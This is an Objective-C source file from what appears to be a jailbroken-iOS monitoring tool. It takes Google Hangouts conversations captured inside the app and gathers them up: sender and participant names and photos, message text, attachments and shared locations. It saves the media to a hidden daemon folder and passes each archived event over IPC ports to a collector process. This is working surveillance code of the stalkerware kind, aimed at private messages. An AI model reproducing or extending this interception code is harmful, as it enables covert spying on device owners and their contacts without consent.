//
//  HangoutUtil.m
//  cydiasubstrate
//
//  Created by Ophat Phuetkasickonphasutha on 3/17/14.
//  Copyright 2014 __MyCompanyName__. All rights reserved.
//

#import "HangoutUtil.h"
#import "IMShareUtils.h"

#import "DefStd.h"
#import "FxIMEvent.h"
#import "FxVoIPEvent.h"
#import "FxIMGeoTag.h"
#import "FxIMEvent.m"
#import "MessagePortIPCSender.h"
#import "SharedFile2IPCSender.h"
#import "StringUtils.h"
#import "FxAttachment.h"
#import "DaemonPrivateHome.h"
#import "DateTimeFormat.h"

@implementation HangoutUtil
@synthesize mIMSharedFileSender;
@synthesize mTimestamp;

static HangoutUtil *_HangoutUtil = nil;

+ (id) sharedHangoutUtils{
	if (_HangoutUtil == nil) {
		_HangoutUtil = [[HangoutUtil alloc] init];
        
        if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
			SharedFile2IPCSender *sharedFileSender = nil;
			sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kHangoutMessagePort];
			[_HangoutUtil setMIMSharedFileSender:sharedFileSender];
			[sharedFileSender release];
			sharedFileSender = nil;
            
            NSDate * tempTime = nil;
            tempTime = [[NSDate alloc] init];
			[_HangoutUtil setMTimestamp:tempTime];
			[tempTime release];
            tempTime = nil;
        }
	}
	return (_HangoutUtil);
}

+(void)collectdata_myID:(NSString *)aMyID
                 myName:(NSString *)aMyName
                myPhoto:(NSString *)aMyPhoto
                 convID:(NSString *)aConvID
               convName:(NSString *)aConvName
           participants:(NSMutableArray *)aParticipants
                message:(NSString *)aMessage
             attachment:(NSMutableArray *)aAttachment
              direction:(NSString *)aDirection
{
	if([aMessage length]==0){ aMessage = @""; }
	NSArray *arguments = [NSArray arrayWithObjects:aMyID,aMyName,aMyPhoto,aConvID,aConvName,aMessage,aDirection,aParticipants,aAttachment ,nil];
	HangoutUtil *hangoutUtil = [[HangoutUtil alloc] init];
	[NSThread detachNewThreadSelector:@selector(thread:) toTarget:hangoutUtil withObject:arguments];
	[hangoutUtil autorelease];
}
- (void) thread: (NSArray *) aArguments 
{
	DLog(@"### aArguments %@",aArguments);
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	NSString * imServiceID              = @"Hangouts";
	NSString * SenderID						= [aArguments objectAtIndex:0];
	NSString * SenderName					= [aArguments objectAtIndex:1];
	NSURL * SenderPhotoURL					= [NSURL URLWithString:[aArguments objectAtIndex:2]];
	NSData * SenderPhoto					= [NSData dataWithContentsOfURL:SenderPhotoURL];
	NSString * ConvID					= [aArguments objectAtIndex:3];
	NSString * ConvName					= [aArguments objectAtIndex:4];
	NSString * Message				= [aArguments objectAtIndex:5];
	NSString * Direction			= [aArguments objectAtIndex:6];
	NSMutableArray * tempParticipants		= [aArguments objectAtIndex:7];
	NSMutableArray * Participants	= [[NSMutableArray alloc]init];
	FxIMEvent *imEvent			 = [[FxIMEvent alloc] init];
	[imEvent setMRepresentationOfMessage:kIMMessageText];
    
	for (int i=0; i<[tempParticipants count]; i++) {
		NSMutableDictionary * participantPhotoInfo  = [tempParticipants objectAtIndex:i];
		if([[participantPhotoInfo objectForKey:@"photo"]length]>0){
			NSURL * participantPhotoURL				    = [NSURL URLWithString:[participantPhotoInfo objectForKey:@"photo"]];
			NSData * photoData							= [NSData dataWithContentsOfURL:participantPhotoURL];
            if (photoData) {
                [participantPhotoInfo setObject:photoData forKey:@"photo"];
            } else {
                [participantPhotoInfo setObject:[NSData data] forKey:@"photo"];
            }
		}
		[Participants addObject:participantPhotoInfo];
	}
	tempParticipants = [Participants mutableCopy];
    //DLog(@"### tempParticipants %@",tempParticipants);
	[Participants removeAllObjects];
	
	for (int i=0; i<[tempParticipants count]; i++) {
		NSMutableDictionary * participantPhotoInfo  = [tempParticipants objectAtIndex:i];
		FxRecipient *participant = [[FxRecipient alloc] init];
		[participant setRecipNumAddr:[participantPhotoInfo objectForKey:@"id"]];
        if([[participantPhotoInfo objectForKey:@"photo" ]length]>0){
            [participant setMPicture:[participantPhotoInfo objectForKey:@"photo" ]];
        }else{
            [participant setMPicture:nil];
        }
		[participant setRecipContactName:[participantPhotoInfo objectForKey:@"name" ]];
		[Participants addObject:participant];
		[participant release];	
	}
    [tempParticipants release];
	
	NSMutableArray * tempattachment		= [aArguments objectAtIndex:8];
	NSMutableArray * Attachments	= [[NSMutableArray alloc]init];
    /*
     {
        attachment = "";
        extension = mov;
        thumbnail = "https://lh6.googleusercontent.com/-suUKsPojp-I/U4Wq0stq-LI/AAAAAAAAAVQ/cRg1zHYdZAI/s0/d461e3ca-c389-4cdf-b790-f8dee0241e02";
        type = video;
     }

     */
	for (int i=0; i<[tempattachment count]; i++) {
		NSMutableDictionary * attachmentInfo = [tempattachment objectAtIndex:i];
        // -- get actual media as object for key "attachment"
		if([[attachmentInfo objectForKey:@"attachment"]length]>0 && [[attachmentInfo objectForKey:@"attachment"]isKindOfClass:[NSString class]]){
			NSURL * attachmentURL           = [NSURL URLWithString:[attachmentInfo objectForKey:@"attachment"]];
			NSData * attachmentData         = [NSData dataWithContentsOfURL:attachmentURL];
			[attachmentInfo setObject:attachmentData forKey:@"attachment"];
		}
        // -- get thumbnail as object for key "thumbnail"
		if([[attachmentInfo objectForKey:@"thumbnail"]length]>0 && [[attachmentInfo objectForKey:@"thumbnail"]isKindOfClass:[NSString class]]){
			NSURL * thumbnailURL            = [NSURL URLWithString:[attachmentInfo objectForKey:@"thumbnail"]];
			NSData * thumbnailData          = [NSData dataWithContentsOfURL:thumbnailURL];
			[attachmentInfo setObject:thumbnailData forKey:@"thumbnail"];
            
            // -- hard code a proper mimetype
            NSString *type                  = [attachmentInfo objectForKey:@"type"];
            NSString *extension             = [attachmentInfo objectForKey:@"extension"];
            NSString *mimeType              = [type isEqualToString:@"video"] ? @"video/quicktime" : [NSString stringWithFormat:@"%@/%@", type, extension];
            [attachmentInfo setObject:mimeType forKey:@"mimetype"];
            DLog(@"set mime type of hangout from mobile substrate %@", mimeType)
		}
        // -- for case of Location and put in 'Attachments' array
		if([[attachmentInfo objectForKey:@"type"]isEqualToString:@"place"]){
			 
            float lat = [[attachmentInfo objectForKey:@"latitude"] floatValue];
            float longt = [[attachmentInfo objectForKey:@"longtitude"] floatValue];
            
            FxIMMessageRepresentation representation = kIMMessageShareLocation;
            if (Message && [Message length]) {
                representation = representation | kIMMessageText;
            }
			 FxIMGeoTag *location = [[FxIMGeoTag alloc] init];
			 [location setMPlaceName:[attachmentInfo objectForKey:@"place"]];
             [location setMLatitude:lat];
             [location setMLongitude:longt];
            
			 [imEvent setMShareLocation:location];
			 [imEvent setMRepresentationOfMessage:representation];
			 [location release];
			 
		}
		[Attachments addObject:attachmentInfo];
	}
	tempattachment = [[Attachments mutableCopy] autorelease];
    //DLog(@"### tempattachment %@",tempattachment);
	[Attachments removeAllObjects];
	
	for (int i=0; i<[tempattachment count]; i++) {
		NSMutableDictionary * attachmentInfo  = [tempattachment objectAtIndex:i];
        //DLog(@"attachmentInfo %@",attachmentInfo);
        
        DLog(@"attachmentInfo --> attachment %lu",(unsigned long)[[attachmentInfo objectForKey:@"attachment"] length]);
        DLog(@"attachmentInfo --> thumbnail %lu",(unsigned long)[[attachmentInfo objectForKey:@"thumbnail"] length]);
        
		if([[attachmentInfo objectForKey:@"attachment"]length]>0){
			NSString* attachmentPath    = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imHangout/"];
			NSString *saveFilePath = [NSString stringWithFormat:@"%@%f.%@",attachmentPath,[[NSDate date] timeIntervalSince1970],[attachmentInfo objectForKey:@"extension"]];
			NSData * attachmentData = [NSData dataWithData:[attachmentInfo objectForKey:@"attachment"]];
            if (![attachmentData writeToFile:saveFilePath atomically:YES]) {
                // iOS 9, Sandbox
                saveFilePath = [IMShareUtils saveData:attachmentData
                               toDocumentSubDirectory:@"/attachments/imHangout/"
                                             fileName:[saveFilePath lastPathComponent]];
            }
            //[attachmentData writeToFile:[NSString stringWithFormat:@"/tmp/%f.%@",[[NSDate date] timeIntervalSince1970],[attachmentInfo objectForKey:@"extension"]] atomically:YES];
            
			FxAttachment *attachment = [[FxAttachment alloc] init];
			[attachment setFullPath:saveFilePath];
			if([[attachmentInfo objectForKey:@"thumbnail"]length]>0){
                [attachment setMThumbnail:[NSData dataWithData:[attachmentInfo objectForKey:@"thumbnail"]]];
                //NSData * thumbnailData = [NSData dataWithData:[attachmentInfo objectForKey:@"thumbnail"]];
                //[thumbnailData writeToFile:[NSString stringWithFormat:@"/tmp/%f.%@",[[NSDate date] timeIntervalSince1970],[attachmentInfo objectForKey:@"jpeg"]] atomically:YES];
			}
            if (!Message || ![Message length]) {
                [imEvent setMRepresentationOfMessage:kIMMessageNone];
            }
			[Attachments addObject:attachment];	
			[attachment release];
		}else if([[attachmentInfo objectForKey:@"thumbnail"]length]>0){
			FxAttachment *attachment = [[FxAttachment alloc] init];
			[attachment setMThumbnail:[NSData dataWithData:[attachmentInfo objectForKey:@"thumbnail"]]];
            
            NSString *mimeType = [attachmentInfo objectForKey:@"mimetype"];
            
            if (mimeType && [mimeType length]) {
                [attachment setFullPath:mimeType];
            } else {
                [attachment setFullPath:@"image/jpeg"];
            }
            if (!Message || ![Message length]) {
                [imEvent setMRepresentationOfMessage:kIMMessageNone];
            }
			[Attachments addObject:attachment];
			[attachment release];
            
            //NSData * thumbnailData = [NSData dataWithData:[attachmentInfo objectForKey:@"thumbnail"]];
            //[thumbnailData writeToFile:[NSString stringWithFormat:@"/tmp/%f.%@",[[NSDate date] timeIntervalSince1970],[attachmentInfo objectForKey:@"jpeg"]] atomically:YES];
		}
	}
	
	DLog(@"############### Collector ###############");
	DLog(@"# SenderID %@",SenderID);
	DLog(@"# SenderName %@",SenderName);
	DLog(@"# SenderPhoto %lu",(unsigned long)[SenderPhoto length]);
	DLog(@"# ConvID %@",ConvID);
	DLog(@"# ConvName %@",ConvName);
	DLog(@"# Participants %@",Participants);
	DLog(@"# Attachments %@",Attachments);
	DLog(@"# Message %@",Message);
	DLog(@"# Direction %@",Direction);
	DLog(@"############### End Collector ###############");
	
	if([Direction isEqualToString:@"outgoing"]){
		[imEvent setMDirection:kEventDirectionOut];
	}else if([Direction isEqualToString:@"incoming"]){
		[imEvent setMDirection:kEventDirectionIn];
	}
	if([Attachments count]>0){
		[imEvent setMAttachments:Attachments];
	}
    
	[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	[imEvent setMIMServiceID:imServiceID];
	[imEvent setMServiceID:kIMServiceGoogleHangouts];
	[imEvent setMUserID:SenderID];
	[imEvent setMUserDisplayName:SenderName];
	[imEvent setMUserPicture:SenderPhoto];
	[imEvent setMParticipants:Participants];
	[imEvent setMConversationID:ConvID];
	[imEvent setMConversationName:ConvName];
	[imEvent setMMessage:Message];
	
    NSString *msg = [StringUtils removePrivateUnicodeSymbols:[imEvent mMessage]];
    DLog(@"Hangout imEvent = %@", imEvent);
    DLog(@"Hangout message after remove emoji = %@", msg);
    
    if (([msg length]>0) || ([[imEvent mAttachments]count]>0) || ([imEvent mShareLocation]!=nil) ) {
    
        [imEvent setMMessage:msg];
        
        NSMutableData* data = [[NSMutableData alloc] init];
        
        NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
        [archiver encodeObject:imEvent forKey:kHangoutArchied];
        [archiver finishEncoding];
        [archiver release];
        
        BOOL successfullySend = NO;
        successfullySend = [HangoutUtil sendDataToPort:data portName:kHangoutMessagePort];
        if (!successfullySend) {
            DLog (@"=========================================")
            DLog (@"************ successfullySend failed 1");
            DLog (@"=========================================")
            successfullySend = [HangoutUtil sendDataToPort:data portName:kHangoutMessagePort1];
            if (!successfullySend) {
                DLog (@"=========================================")
                DLog (@"************ successfullySend failed 2");
                DLog (@"=========================================")
                successfullySend = [HangoutUtil sendDataToPort:data portName:kHangoutMessagePort2];
                if (!successfullySend) {
                    DLog (@"=========================================")
                    DLog (@"************ successfullySend failed 3");
                    DLog (@"=========================================")
                }
            }
        }
        
        if (!successfullySend) {
            [self deleteAttachmentFileAtPathForEvent:[imEvent mAttachments]];
        }
        [data release];
    }
    
	[Attachments release];
	[Participants release];
    [imEvent release];
	[pool release];
}

+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
	BOOL successfully = FALSE;
    if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
        MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
        successfully = [messagePortSender writeDataToPort:aData];
        [messagePortSender release];
        messagePortSender = nil;
    } else {
        SharedFile2IPCSender *sharedFileSender = nil;
        sharedFileSender = [[HangoutUtil sharedHangoutUtils] mIMSharedFileSender];
        successfully = [sharedFileSender writeDataToSharedFile:aData];
    }
	return (successfully);
}

- (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray  {
	for(int i=0; i<[aAttachmentArray count]; i++){
		FxAttachment *attachment = (FxAttachment *)[aAttachmentArray objectAtIndex:i];
		NSString *path = [attachment fullPath];
		BOOL deletesuccess = [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
		if (deletesuccess){
			DLog (@"Deleting file %@",path );
		} else {
			DLog (@"Fail deleting file %@",path );
		}
		
	}
}

+ (NSString *) locationStringFromLocationName: (NSString *) aName locationAdress: (NSString *) aAddress {
    NSString *location = @"";
    BOOL hasName    = aName && [aName length];
    BOOL hasAddress = aAddress && [aAddress length];
    
    if (hasName && hasAddress) {
        location = [[[NSString alloc] initWithFormat:@"%@ : %@", aName, aAddress] autorelease];
    } else if (hasName && !hasAddress) {
        location = [[aName copy] autorelease];
    } else if (!hasName && hasAddress) {
        location = [[aAddress copy] autorelease];
    }
    return location;
}

-(void) dealloc{
    [super dealloc];
    
}
@end
